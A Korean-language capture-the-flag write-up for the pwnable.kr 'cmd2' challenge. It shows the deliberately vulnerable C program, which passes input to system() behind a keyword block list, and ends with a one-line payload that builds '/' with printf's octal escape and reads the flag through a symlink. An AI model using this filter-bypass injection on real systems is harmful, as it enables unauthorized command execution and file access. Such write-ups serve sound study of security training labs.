# cmd2

> Daddy bought me a system command shell.
> but he put some filters to prevent me from playing with it without his permission...
> but I wanna play anytime I want!

# 문제 개요
* pwnable.kr
* 9 points
* files: cmd2, cmd2.c, flag

# 프로그램 분석
c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
\tint r=0;
\tr += strstr(cmd, \u003d")!=0;
\tr += strstr(cmd, "PATH")!=0;
\tr += strstr(cmd, "export")!=0;
\tr += strstr(cmd, "/")!=0;
\tr += strstr(cmd, "`")!=0;
\tr += strstr(cmd, "flag")!=0;
\treturn r;
}

extern char** environ;
void delete_env(){
\tchar** p;
\tfor(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
\tdelete_env();
\tputenv("PATH=/no_command_execution_until_you_become_a_hacker");
\tif(filter(argv[1])) return 0;
\tprintf("%s\
", argv[1]);
\tsetregid(getegid(), getegid());
\tsystem( argv[1] );
\treturn 0;
}

`filter` 함수는 `=`, `PATH`, `export`, `/`, `` ` ``, `flag` 문자열을 포함하는 명령어를 차단합니다. `system()` 함수를 통해 명령어를 실행하지만, `filter`를 통과해야 하므로 `/` 문자 사용에 제한이 있습니다.

# 설계 및 시나리오
`system()` 함수 실행을 위해 명령어를 전달해야 하지만, `/` 문자가 필터링되어 절대 경로로 명령어를 실행할 수 없습니다. 이를 우회하기 위해 `printf`의 이중 인코딩 기능을 활용하여 `/` 문자를 생성합니다. 또한, `flag` 문자열이 필터링되므로, `flag` 파일을 `ddong`이라는 이름으로 심볼릭 링크하여 `flag` 문자열 사용을 회피합니다. 최종적으로 `.\$(printf '\\057')cat ddong` 명령어를 구성하여 실행합니다.

# 익스플로잇
`/` 문자를 `printf '\\057'`으로 우회하고, `flag` 문자열 필터를 피하기 위해 심볼릭 링크 `ddong`을 사용합니다.

bash
/home/cmd2/cmd2 ".\\$(printf '\\057')cat ddong"


